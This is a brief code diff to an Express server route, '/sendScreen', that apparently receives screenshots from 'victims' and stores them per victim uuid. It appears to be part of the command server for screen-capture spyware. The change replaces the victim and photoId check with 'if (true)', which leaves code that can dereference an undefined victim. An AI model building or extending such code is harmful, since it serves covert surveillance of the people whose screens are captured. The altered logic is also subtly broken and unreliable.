@@ -82,9 +82,8 @@ app.post('/sendScreen', async (req,res) => {
       console.log(req.body)
       const victim = victims.find(v => v.uuid === req.body.uuid)
       console.log(victim)
-      if (victim && victim.photoId) {
+      if (true) {
         victim.currentPhoto = req.body.image
-        victim.photoId = req.body.photoId
         console.log('added photo!')
         safeJson(res,req,{'ok': true, 'msg': 'a'},200)
       } else {
